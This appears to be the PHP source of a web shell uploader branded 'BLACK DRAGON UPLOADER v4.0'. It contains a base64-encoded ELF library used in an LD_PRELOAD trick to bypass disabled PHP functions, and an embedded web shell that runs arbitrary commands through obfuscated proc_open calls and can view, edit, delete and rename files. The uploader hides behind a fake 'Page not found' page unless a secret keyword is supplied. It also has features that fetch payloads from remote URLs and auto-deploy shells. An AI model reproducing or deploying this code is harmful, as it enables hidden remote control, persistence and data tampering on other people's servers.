AAAAAAAAAAAAAAAAAAGQAAAAIADADgBwAAAAAAAAAAAAAAAAAAGwAAAAIADAAgCAAAAAAAAAAAAAAAAAAALgAAAAIADABwCAAAAAAAAAAAAAAAAAAARAAAAAEAGABoECAAAAAAAAEAAAAAAAAAUwAAAAEAEgAIDiAAAAAAAAAAAAAAAAAAegAAAAIADACwCAAAAAAAAAAAAAAAAAAAhgAAAAEAEQD4DSAAAAAAAAAAAAAAAAAApQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAArAAAAAEAEABoCgAAAAAAAAAAAAAAAAAAugAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAxgAAAAEAFwBgECAAAAAAAAAAAAAAAAAA0wAAAAEAFAAYDiAAAAAAAAAAAAAAAAAA3AAAAAAADwB4CQAAAAAAAAAAAAAAAAAA7wAAAAEAFwBoECAAAAAAAAAAAAAAAAAA+wAAAAEAFgAAECAAAAAAAAAAAAAAAAAAEQEAABIAAAAAAAAAAAAAAAAAAAAAAAAAJQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAQQEAABAAFwBoECAAAAAAAAAAAAAAAAAASAEAABIADAAUCQAAAAAAACkAAAAAAAAAUgEAABIADQBcCQAAAAAAAAAAAAAAAAAAWAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAbAEAABIADADgCAAAAAAAADQAAAAAAAAAcAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAhAEAACAAAAAAAAAAAAAAAAAAAAAAAAAAkwEAABIADAA9CQAAAAAAAB0AAAAAAAAAnQEAABAAGABwECAAAAAAAAAAAAAAAAAAogEAABAAGABoECAAAAAAAAAAAAAAAAAArgEAABIAAAAAAAAAAAAAAAAAAAAAAAAAwQEAACAAAAAAAAAAAAAAAAAAAAAAAAAA1QEAABIAAAAAAAAAAAAAAAAAAAAAAAAA6wEAABIAAAAAAAAAAAAAAAAAAAAAAAAA/QEAACAAAAAAAAAAAAAAAAAAAAAAAAAAFwIAACIAAAAAAAAAAAAAAAAAAAAAAAAAMwIAABIACQAYBwAAAAAAAAAAAAAAAAAAOQIAABIAAAAAAAAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAX19KQ1JfTElTVF9fAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eABjb21wbGV0ZWQuNjk3MgBfX2RvX2dsb2JhbF9kdG9yc19hdXhfZmluaV9hcnJheV9lbnRyeQBmcmFtZV9kdW1teQBfX2ZyYW1lX2R1bW15X2luaXRfYXJyYXlfZW50cnkAaG9vay5jAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fR05VX0VIX0ZSQU1FX0hEUgBfX1RNQ19FTkRfXwBfR0xPQkFMX09GRlNFVF9UQUJMRV8AZ2V0ZW52QEBHTElCQ18yLjIuNQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX2VkYXRhAGRhZW1vbml6ZQBfZmluaQBzeXN0ZW1AQEdMSUJDXzIuMi41AHB3bgBzaWduYWxAQEdMSUJDXzIuMi41AF9fZ21vbl9zdGFydF9fAHByZWxvYWRtZQBfZW5kAF9fYnNzX3N0YXJ0AGNobW9kQEBHTElCQ18yLjIuNQBfSnZfUmVnaXN0ZXJDbGFzc2VzAHVuc2V0ZW52QEBHTElCQ18yLjIuNQBleGl0QEBHTElCQ18yLjIuNQBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplQEBHTElCQ18yLjIuNQBfaW5pdABmb3JrQEBHTElCQ18yLjIuNQAALnN5bXRhYgAuc3RydGFiAC5zaHN0cnRhYiAubm90ZS5nbnUuYnVpbGQtaWQALmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJlbGEuZHluAC5yZWxhLnBsdAAuaW5pdAAucGx0LmdvdAAudGV4dAAuZmluaQAucm9kYXRhAC5laF9mcmFtZV9oZHIALmVoX2ZyYW1lAC5pbml0X2FycmF5AC5maW5pX2FycmF5AC5qY3IALmR5bmFtaWMALmdvdC5wbHQALmRhdGEALmJzcwAuY29tbWVudAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAAHAAAAAgAAAAAAAADIAQAAAAAAAMgBAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAuAAAA9v//bwIAAAAAAAAA8AEAAAAAAADwAQAAAAAAAEQAAAAAAAAAAwAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAOAAAAAsAAAACAAAAAAAAADgCAAAAAAAAOAIAAAAAAAD4AQAAAAAAAAQAAAABAAAACAAAAAAAAAAYAAAAAAAAAEAAAAADAAAAAgAAAAAAAAAwBAAAAAAAADAEAAAAAAAA6QAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAABIAAAA////bwIAAAAAAAAAGgUAAAAAAAAaBQAAAAAAACoAAAAAAAAAAwAAAAAAAAACAAAAAAAAAAIAAAAAAAAAVQAAAP7//28CAAAAAAAAAEgFAAAAAAAASAUAAAAAAAAgAAAAAAAAAAQAAAABAAAACAAAAAAAAAAAAAAAAAAAAGQAAAAEAAAAAgAAAAAAAABoBQAAAAAAAGgFAAAAAAAA2AAAAAAAAAADAAAAAAAAAAgAAAAAAAAAGAAAAAAAAABuAAAABAAAAEIAAAAAAAAAQAYAAAAAAABABgAAAAAAANgAAAAAAAAAAwAAABYAAAAIAAAAAAAAABgAAAAAAAAAeAAAAAEAAAAGAAAAAAAAABgHAAAAAAAAGAcAAAAAAAAXAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAHMAAAABAAAABgAAAAAAAAAwBwAAAAAAADAHAAAAAAAAoAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAB+AAAAAQAAAAYAAAAAAAAA0AcAAAAAAADQBwAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAhwAAAAEAAAAGAAAAAAAAAOAHAAAAAAAA4AcAAAAAAAB6AQAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAI0AAAABAAAABgAAAAAAAABcCQAAAAAAAFwJAAAAAAAACQAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACTAAAAAQAAAAIAAAAAAAAAZQkAAAAAAABlCQAAAAAAABMAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAmwAAAAEAAAACAAAAAAAAAHgJAAAAAAAAeAkAAAAAAAA0AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAKkAAAABAAAAAgAAAAAAAACwCQAAAAAAALAJAAAAAAAAvAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAACzAAAADgAAAAMAAAAAAAAA+A0gAAAAAAD4DQAAAAAAABAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAvwAAAA8AAAADAAAAAAAAAAgOIAAAAAAACA4AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAMsAAAABAAAAAwAAAAAAAAAQDiAAAAAAABAOAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADQAAAABgAAAAMAAAAAAAAAGA4gAAAAAAAYDgAAAAAAAMABAAAAAAAABAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAggAAAAEAAAADAAAAAAAAANgPIAAAAAAA2A8AAAAAAAAoAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAANkAAAABAAAAAwAAAAAAAAAAECAAAAAAAAAQAAAAAAAAYAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADiAAAAAQAAAAMAAAAAAAAAYBAgAAAAAABgEAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA6AAAAAgAAAADAAAAAAAAAGgQIAAAAAAAaBAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAO0AAAABAAAAMAAAAAAAAAAAAAAAAAAAAGgQAAAAAAAALQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAACYEAAAAAAAABgGAAAAAAAAGwAAAC0AAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAsBYAAAAAAABLAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAPsYAAAAAAAA9gAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=\';\n        $cmdd = $_POST[\'cmd_input\'];\n        $meterpreter = $en($cmdd." > test.txt");\n        $viewCommandResult = \'<hr><p>Result: <font color="black">base64 : \' . $meterpreter .\'</br>Please Refresh and Check File test.txt, this output command<br>test.txt created = VULN<br>test.txt not created = NOT VULN<br>example access: domain.com/yourpath/path/test.txt<br>Powered By BLACK DRAGON</font><br><br></textarea>\';        \n        $a($full . \'/chankro.so\', $base($hook));\n        $a($full . \'/acpid.socket\', $base($meterpreter));\n        $p(\'CHANKRO=\' . $full . \'/acpid.socket\');\n        $p(\'LD_PRELOAD=\' . $full . \'/chankro.so\');\n        $m(\'a\',\'a\',\'a\',\'a\');\n    }elseif (isset($_POST[\'delete_file\'])) {\n        bdLogActivity("DELETE: " . $_POST[\'delete_file\']);\n        $fileToDelete = $currentDirectory . \'/\' . $_POST[\'delete_file\'];\n        if (file_exists($fileToDelete)) {\n            if (is_dir($fileToDelete)) {\n                if (deleteDirectory($fileToDelete)) {\n                    echo \'<hr>Folder deleted successfully!\';\n                } else {\n                    echo \'<hr>Error: Failed to delete folder!\';\n                }\n            } else {\n                if ($unl($fileToDelete)) {\n                    echo \'<hr>File deleted successfully!\';\n                } else {\n                    echo \'<hr>Error: Failed to delete file!\';\n                }\n            }\n        } else {\n            echo \'<hr>Error: File or directory not found!\';\n        }\n    } elseif (isset($_POST[\'rename_item\']) && isset($_POST[\'old_name\']) && isset($_POST[\'new_name\'])) {\n        bdLogActivity("RENAME: " . $_POST[\'old_name\'] . " -> " . $_POST[\'new_name\']);\n        $oldName = $currentDirectory . \'/\' . $_POST[\'old_name\'];\n        $newName = $currentDirectory . \'/\' . $_POST[\'new_name\'];\n        if (file_exists($oldName)) {\n            if (rename($oldName, $newName)) {\n                echo \'<hr>Item renamed successfully!\';\n            } else {\n                echo \'<hr>Error: Failed to rename item!\';\n            }\n        } else {\n            echo \'<hr>Error: Item not found!\';\n        }\n    }elseif (isset($_POST[\'cmd_biasa\'])) {\n        bdLogActivity("COMMAND BIASA: " . substr($_POST[\'cmd_biasa\'], 0, 200));\n            $pp = "p"."r"."o"."c"."_"."o"."p"."e"."n";\n            $pc = "f"."c"."l"."o"."s"."e";\n            $ppc = "p"."r"."o"."c"."_"."c"."l"."o"."s"."e";\n            $stg = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";\n            $command = $_POST[\'cmd_biasa\'];\n            $descriptorspec = [\n                0 => [\'pipe\', \'r\'],\n                1 => [\'pipe\', \'w\'],\n                2 => [\'pipe\', \'w\']\n            ];\n            $process = $pp($command, $descriptorspec, $pipes);\n            if (is_resource($process)) {\n                $output = $stg($pipes[1]);\n                $errors = $stg($pipes[2]);\n                $pc($pipes[1]);\n                $pc($pipes[2]);\n                $ppc($process);\n                if (!empty($errors)) {\n                    $viewCommandResult = \'<hr><p>Error: </p><textarea class="result-box">\' . $htm($errors) . \'</textarea>\';\n                } else {\n                    $viewCommandResult = \'<hr><p>Result: </p><textarea class="result-box">\' . $htm($output) . \'</textarea>\';\n                }\n            } else {\n                $viewCommandResult = \'Result:</p><textarea class="result-box">Error: Failed to execute command! </textarea>\';\n            }\n    } elseif (isset($_POST[\'view_file\'])) {\n        bdLogActivity("VIEW FILE: " . $_POST[\'view_file\']);\n        $fileToView = $currentDirectory . \'/\' . $_POST[\'view_file\'];\n        if (file_exists($fileToView)) {\n            $fileContent = $fgc($fileToView);\n            $viewCommandResult = \'<hr><p>Result: \' . $_POST[\'view_file\'] . \'</p>\n            <form method="post" action="?\'.(isset($_SERVER[\'QUERY_STRING\']) ? $_SERVER[\'QUERY_STRING\'] : \'\').\'">\n            <textarea name="content" class="result-box">\' . $htm($fileContent) . \'</textarea><td>\n            <input type="hidden" name="edit_file" value="\' . $_POST[\'view_file\'] . \'">\n            <input type="submit" value=" Save "></form></td>\';\n        } else {\n            $viewCommandResult = \'<hr><p>Error: File not found!</p>\';\n        }\n    }  elseif (isset($_POST[\'edit_file\'])) {\n        bdLogActivity("EDIT FILE: " . $_POST[\'edit_file\']);\n        $ef = $currentDirectory . \'/\' . $_POST[\'edit_file\'];\n        $newContent = $_POST[\'content\'];\n        if ($fpc($ef, $newContent) !== false) {\n            echo \'<hr>File Edited successfully! \' . $_POST[\'edit_file\'].\'<hr>\';\n        } else {\n            echo \'<hr>Error: Failed Edit File! \' . $_POST[\'edit_file\'].\'<hr>\';\n        }\n    }\n}\n\necho \'<hr>DIR: \';\n$directories = $expl(DIRECTORY_SEPARATOR, $currentDirectory);\n$currentPath = \'\';\nforeach ($directories as $index => $dir) {\n    $currentPath .= DIRECTORY_SEPARATOR . $dir;\n    if ($index == 0) {\n        echo \'/<a href="?d=\' . x($currentPath) . \'">\' . $dir . \'</a>\';\n    } else {\n        echo \'/<a href="?d=\'. x($currentPath) . \'">\' . $dir . \'</a>\';\n    }\n}\necho \'<a href="?d=\' . x($scriptDirectory) . \'"> / <span style="color: green;">[ GO Home ]</span></a>\';\necho \'<br>\';\necho \'<hr><form method="post" enctype="multipart/form-data">\';\necho \'<hr>\';\necho \'<input type="file" name="fileToUpload" id="fileToUpload" placeholder="pilih file:">\';\necho \'<input type="submit" value="Upload File" name="submit">\';\necho \'</form><hr>\';\necho \'<table border="5"><tbody>\n<tr>\n<td>\n<center>Command BYPASS<form method="post" action="?\'.(isset($_SERVER[\'QUERY_STRING\']) ? $_SERVER[\'QUERY_STRING\'] : \'\').\'">\n<input type="text" name="cmd_input" placeholder="Enter command"><input type="submit" value="Run Command"></form></center></td>\n<td><center>Command BIASA<form method="post" action="?\'.(isset($_SERVER[\'QUERY_STRING\']) ? $_SERVER[\'QUERY_STRING\'] : \'\').\'">\n<input type="text" name="cmd_biasa" placeholder="Enter command"><input type="submit" value="Run Command"></form><center></td>\n<td><center>Create Folder<form method="post" action="?\'.(isset($_SERVER[\'QUERY_STRING\']) ? $_SERVER[\'QUERY_STRING\'] : \'\').\'">\n<input type="text" name="folder_name" placeholder="Folder Name"><input type="submit" value="Create Folder"></form><center></td>\n<td><center>Create File<form method="post" action="?\'.(isset($_SERVER[\'QUERY_STRING\']) ? $_SERVER[\'QUERY_STRING\'] : \'\').\'">\n<input type="text" name="file_name" placeholder="File Name"><input type="submit" value="Create File"></form></td></tr>\n</tbody></table>\';\necho $viewCommandResult;\necho \'<table border=1>\';\necho \'<br><tr><th><center>Item Name</th><th><center>Size</th><th><center>Date</th><th>Permissions</th><th><center>View</th><th><center>Delete</th><th><center>Rename</th></tr></center></center></center>\';\nforeach ($scd($currentDirectory) as $v) {\n    $u = $ril($v);\n    $s = $st($u);\n    $itemLink = $isdir($v) ? \'?d=\' . x($currentDirectory . \'/\' . $v) : \'?\'.(\'d=\'.x($currentDirectory).\'&f=\'.x($v));\n    $permission = substr(sprintf(\'%o\', fileperms($u)), -4);\n    $writable = $isw($u);\n    echo \'<tr>\n            <td class="item-name"><a href="\'.$itemLink.\'">\'.$v.\'</a></td>\n            <td class="size">\'.filesize($u).\'</td>\n            <td class="date" style="text-align: center;">\'.date(\'Y-m-d H:i:s\', filemtime($u)).\'</td>\n            <td class="permission \'.($writable ? \'writable\' : \'not-writable\').\'">\'.$permission.\'</td>\n            <td><center><form method="post" action="?\'.(isset($_SERVER[\'QUERY_STRING\']) ? $_SERVER[\'QUERY_STRING\'] : \'\').\'"><input type="hidden" name="view_file" value="\'.$htm($v).\'"><input type="submit" value=" View "></form></center></td>\n            <td><center><form method="post" action="?\'.(isset($_SERVER[\'QUERY_STRING\']) ? $_SERVER[\'QUERY_STRING\'] : \'\').\'"><input type="hidden" name="delete_file" value="\'.$htm($v).\'"><input type="submit" value="Delete"></form></center></td>\n            <td><form method="post" action="?\'.(isset($_SERVER[\'QUERY_STRING\']) ? $_SERVER[\'QUERY_STRING\'] : \'\').\'"><input type="hidden" name="old_name" value="\'.$htm($v).\'"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>\n        </tr>\';\n}\necho \'</table>\';\n\nfunction deleteDirectory($dir) {\n   $unl = "u"."n"."l"."i"."n"."k";\n    if (!file_exists($dir)) {\n        return true;\n    }\n    if (!is_dir($dir)) {\n        return $unl($dir);\n    }\n    $scd = "s"."c"."a"."n"."d"."i"."r";\n    foreach ($scd($dir) as $item) {\n        if ($item == \'.\' || $item == \'..\') {\n            continue;\n        }\n        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {\n            return false;\n        }\n    }\n    return rmdir($dir);\n}\n';
}
/* tulis file aman (basename saja) */
function bdUpWrite($name, $data) {
    $name = basename($name);
    if ($name === '' || $name === '.' || $name === '..') { return false; }
    $path = dirname(__FILE__) . '/' . $name;
    if (@file_put_contents($path, $data) === false) { return false; }
    @chmod($path, 0644);
    return $path;
}
/* deteksi BD PACK dari isi */
function bdUpIsPack($text) {
    return is_string($text) && strpos($text, 'BDPACK|') === 0;
}
/* unpack BD PACK -> array( name => data ) ; false kalau bukan pack */
function bdUpParsePack($text) {
    $lines = preg_split('/\r\n|\r|\n/', $text);
    if (!$lines || strpos($lines[0], 'BDPACK|') !== 0) { return false; }
    $head = explode('|', $lines[0]);
    $defaultName = (isset($head[2]) && $head[2] !== '') ? basename($head[2]) : 'blackdragon.php';
    $out = array();
    $curName = $defaultName;
    $curB64  = '';
    $n = count($lines);
    for ($i = 1; $i < $n; $i++) {
        $l = $lines[$i];
        if (strpos($l, 'FILE|') === 0 || strpos($l, 'BD|') === 0) {
            if ($curName !== '' && $curB64 !== '') {
                $d = bdUpB64($curB64);
                if ($d !== false && $d !== '') { $out[$curName] = $d; }
            }
            $parts   = explode('|', $l, 2);
            $curName = basename(trim(isset($parts[1]) ? $parts[1] : ''));
            $curB64  = '';
        } else {
            $curB64 .= trim($l);
        }
    }
    if ($curName !== '' && $curB64 !== '') {
        $d = bdUpB64($curB64);
        if ($d !== false && $d !== '') { $out[$curName] = $d; }
    }
    return empty($out) ? false : $out;
}
/* unpack + tulis; return array(ok, msg) */
function bdUpDeployPack($text) {
    $files = bdUpParsePack($text);
    if ($files === false) { return array(false, 'Bukan BD PACK'); }
    $okCount = 0; $fail = array(); $written = array();
    foreach ($files as $name => $data) {
        $p = bdUpWrite($name, $data);
        if ($p) { $okCount++; $written[] = $name; }
        else { $fail[] = $name; }
    }
    $msg = '[OK] ' . $okCount . ' file ditulis: ' . implode(', ', $written);
    if ($fail) { $msg .= ' | [ERR] gagal: ' . implode(', ', $fail); }
    return array(true, $msg);
}
/* fetch URL (multi metode) */
function bdUpFetch($url) {
    $url = trim($url);
    if ($url === '') { return false; }
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 40,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0',
        ));
        $data = curl_exec($ch);
        curl_close($ch);
        if ($data !== false && $data !== '') { return $data; }
    }
    if (ini_get('allow_url_fopen')) {
        $ctx = stream_context_create(array('http' => array('timeout' => 40, 'ignore_errors' => true)));
        $data = @file_get_contents($url, false, $ctx);
        if ($data !== false && $data !== '') { return $data; }
    }
    $urlEsc = escapeshellarg($url);
    $data = @shell_exec("curl -sSL --max-time 40 $urlEsc 2>/dev/null");
    if ($data !== null && trim($data) !== '') { return $data; }
    $data = @shell_exec("wget -q --timeout=40 -O - $urlEsc 2>/dev/null");
    if ($data !== null && trim($data) !== '') { return $data; }
    return false;
}

/* ================= GATE ================= */
if (!isset($_GET['nagahitam'])) {
    http_response_code(404);
    echo "<!DOCTYPE html><html><head><title>Page not found</title></head>"
       . "<body style='background:#f0f0f1;color:#3c434a;font-family:-apple-system,"
       . "BlinkMacSystemFont,Segoe UI,Roboto,sans-serif'>"
       . "<div style='max-width:560px;margin:80px auto;padding:24px'>"
       . "<h1 style='font-size:23px;font-weight:400'>Page not found</h1>"
       . "<p style='color:#787c82;font-size:14px'>The page you requested could not be found.</p>"
       . "</div></body></html>";
    bdUpLog("AKSES TANPA KATA KUNCI (scanning)");
    return;
}

/* ---------- health probe ---------- */
if (isset($_GET['h']) && $_GET['h'] === 'bd') {
    header('Content-Type: text/plain; charset=utf-8');
    echo $BDProbe;
    return;
}

/* ---------- LOGIN ---------- */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass'])) {
    if (password_verify($_POST['pass'], $BDKey)) {
        session_regenerate_id(true);
        $_SESSION['bd_up_auth'] = true;
        bdUpLog("LOGIN BERHASIL");
    } else {
        bdUpLog("LOGIN GAGAL - password salah");
        http_response_code(404);
        echo "<h1>Page not found</h1>";
        return;
    }
}

/* ---------- LOGOUT ---------- */
if (isset($_GET['logout'])) {
    bdUpLog("LOGOUT");
    $_SESSION = array();
    session_destroy();
    http_response_code(404);
    echo "<h1>Page not found</h1>";
    return;
}

/* ---------- HALAMAN LOGIN ---------- */
if (empty($_SESSION['bd_up_auth'])) {
    echo "<!DOCTYPE html><html><head><title>404</title><meta charset='utf-8'>"
       . "<style>body{margin:0;min-height:100vh;background:linear-gradient(135deg,#0a0a0f,#1a1a2e);"
       . "display:flex;align-items:center;justify-content:center;font-family:'Segoe UI',sans-serif}"
       . ".bd-box{background:rgba(8,8,14,.85);border:1px solid #6d3b8f;border-radius:14px;"
       . "padding:42px 38px;width:320px;text-align:center;box-shadow:0 0 40px rgba(109,59,143,.45)}"
       . ".bd-logo{color:#c084fc;font-weight:800;letter-spacing:3px;font-size:18px;"
       . "text-shadow:0 0 14px rgba(192,132,252,.8);margin-bottom:24px}"
       . "input{width:100%;box-sizing:border-box;padding:12px 14px;margin:6px 0;"
       . "background:rgba(20,20,30,.85);border:1px solid #3a2a4d;border-radius:8px;color:#eee;outline:none}"
       . "input:focus{border-color:#9333ea}button{width:100%;padding:12px;margin-top:10px;"
       . "background:linear-gradient(90deg,#7c3aed,#a855f7);color:#fff;border:0;border-radius:8px;"
       . "font-weight:700;cursor:pointer}button:hover{filter:brightness(1.15)}</style></head><body>"
       . "<div class='bd-box'><div class='bd-logo'>&#9650; BLACK DRAGON UPLOADER &#9650;</div>"
       . "<form method='post' autocomplete='off'>"
       . "<input type='password' name='pass' placeholder='Password' autofocus>"
       . "<button>Masuk</button></form></div></body></html>";
    return;
}

/* ================= AUTHENTICATED ================= */

$result = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    /* 1. Upload Manual */
    if (isset($_FILES['fileToUpload']) && $_FILES['fileToUpload']['error'] === UPLOAD_ERR_OK) {
        $fname = basename($_FILES['fileToUpload']['name']);
        $data  = @file_get_contents($_FILES['fileToUpload']['tmp_name']);
        if ($data === false || $data === '') {
            $result = '<font color="red">[ERR] file kosong / gagal baca</font>';
        } elseif (bdUpIsPack($data)) {
            bdUpLog("UPLOAD BD PACK: " . $fname);
            $r = bdUpDeployPack($data);
            $result = '<font color="' . ($r[0] ? 'green' : 'red') . '">' . htmlspecialchars($r[1]) . '</font>';
        } else {
            bdUpLog("UPLOAD MANUAL: " . $fname);
            if (bdUpWrite($fname, $data)) {
                $result = '<font color="green">[OK] File uploaded: ' . htmlspecialchars($fname) . '</font>';
            } else {
                $result = '<font color="red">[ERR] Gagal upload file</font>';
            }
        }
    }

    /* 2. Ambil dari URL */
    elseif (isset($_POST['url_src']) && trim($_POST['url_src']) !== '') {
        $url    = trim($_POST['url_src']);
        $saveAs = !empty($_POST['url_name']) ? basename($_POST['url_name']) : basename(parse_url($url, PHP_URL_PATH));
        if (empty($saveAs)) { $saveAs = 'shell.php'; }
        bdUpLog("FETCH URL: " . $url . " -> " . $saveAs);
        $data = bdUpFetch($url);
        if ($data === false || $data === '') {
            $result = '<font color="red">[ERR] Gagal fetch dari URL (blocked?)</font>';
        } elseif (bdUpIsPack($data)) {
            $r = bdUpDeployPack($data);
            $result = '<font color="' . ($r[0] ? 'green' : 'red') . '">' . htmlspecialchars($r[1]) . '</font>';
        } elseif (bdUpWrite($saveAs, $data)) {
            $result = '<font color="green">[OK] File dari URL tersimpan: ' . htmlspecialchars($saveAs) . '</font>';
        } else {
            $result = '<font color="red">[ERR] Gagal tulis file: ' . htmlspecialchars($saveAs) . '</font>';
        }
    }

    /* 3. Deploy blackdragon (embedded) */
    elseif (isset($_POST['auto_deploy'])) {
        $shellName = !empty($_POST['shell_name']) ? basename($_POST['shell_name']) : 'blackdragon.php';
        bdUpLog("AUTO-DEPLOY blackdragon.php -> " . $shellName);
        $src = bdUpShellSrc();
        if ($src && bdUpWrite($shellName, $src)) {
            $result = '<font color="green">[OK] BLACK DRAGON shell deployed: ' . htmlspecialchars($shellName) . '</font>'
                    . '<br><font color="blue">Akses: ' . htmlspecialchars(bdUpSelfUrl()) . '/' . htmlspecialchars($shellName) . '?nagahitam</font>';
        } else {
            $result = '<font color="red">[ERR] Gagal deploy shell</font>';
        }
    }

    /* 4. Tempel & Deploy (paste BD PACK / source PHP / base64) */
    elseif (isset($_POST['paste_data']) && trim($_POST['paste_data']) !== '') {
        $paste    = $_POST['paste_data'];
        $saveAs   = !empty($_POST['paste_name']) ? basename($_POST['paste_name']) : 'blackdragon.php';
        $isBase64 = !empty($_POST['paste_b64']);
        bdUpLog("PASTE DEPLOY -> " . $saveAs . ($isBase64 ? " (base64)" : ""));
        $content = $isBase64 ? bdUpB64($paste) : $paste;
        if ($content === false || $content === '') {
            $result = '<font color="red">[ERR] base64 tidak valid / kosong</font>';
        } elseif (bdUpIsPack($content)) {
            $r = bdUpDeployPack($content);
            $result = '<font color="' . ($r[0] ? 'green' : 'red') . '">' . htmlspecialchars($r[1]) . '</font>';
        } elseif (bdUpWrite($saveAs, $content)) {
            $result = '<font color="green">[OK] File ditulis: ' . htmlspecialchars($saveAs) . '</font>';
        } else {
            $result = '<font color="red">[ERR] Gagal tulis file</font>';
        }
    }

    /* 5. Isi File Baru (buat file dari textarea) */
    elseif (isset($_POST['new_file_name']) && trim($_POST['new_file_name']) !== '') {
        $fname = basename($_POST['new_file_name']);
        $data  = isset($_POST['new_file_content']) ? $_POST['new_file_content'] : '';
        bdUpLog("CREATE FILE: " . $fname);
        if (bdUpWrite($fname, $data)) {
            $result = '<font color="green">[OK] File dibuat: ' . htmlspecialchars($fname) . '</font>';
        } else {
            $result = '<font color="red">[ERR] Gagal buat file</font>';
        }
    }

    /* 6. Hapus file */
    elseif (isset($_POST['del_file'])) {
        $fname = basename($_POST['del_file']);
        if ($fname === 'uploader.php') {
            $result = '<font color="red">[ERR] uploader.php tidak boleh dihapus</font>';
        } else {
            bdUpLog("DELETE: " . $fname);
            if (@unlink(dirname(__FILE__) . '/' . $fname)) {
                $result = '<font color="green">[OK] File dihapus: ' . htmlspecialchars($fname) . '</font>';
            } else {
                $result = '<font color="red">[ERR] Gagal hapus / tidak ada</font>';
            }
        }
    }
}

/* URL diri sendiri (untuk tampilkan link akses shell) */
function bdUpSelfUrl() {
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
    $dir  = str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME']));
    if ($dir === '/') { $dir = ''; }
    return $scheme . '://' . $host . $dir;
}

/* ================= UI ================= */
?>
<!DOCTYPE html>
<html>
<head>
    <title>BLACK DRAGON UPLOADER v4.0</title>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <style>
    body { font-family:'Segoe UI',sans-serif; background:linear-gradient(135deg,#0a0a0f,#1a1a2e);
           color:#e8e8f0; margin:0; padding:20px; min-height:100vh; }
    .container { max-width:760px; margin:20px auto; background:rgba(8,8,14,.85);
                 border:1px solid #6d3b8f; border-radius:14px; padding:30px;
                 box-shadow:0 0 40px rgba(109,59,143,.45); }
    .bd-logo { color:#c084fc; font-weight:800; letter-spacing:3px; font-size:22px;
               text-shadow:0 0 14px rgba(192,132,252,.8); text-align:center; margin-bottom:24px; }
    .bd-info { font-size:11px; color:#9a9ab0; text-align:center; margin-bottom:20px; }
    .section { background:rgba(20,20,30,.7); border:1px solid #3a2a4d; border-radius:10px;
               padding:20px; margin-bottom:16px; }
    .section h3 { color:#a855f7; margin:0 0 14px 0; font-size:15px; }
    input[type=text], input[type=password], input[type=file], textarea {
        width:100%; box-sizing:border-box; padding:10px 12px; margin:6px 0;
        background:rgba(20,20,30,.85); border:1px solid #3a2a4d; border-radius:6px;
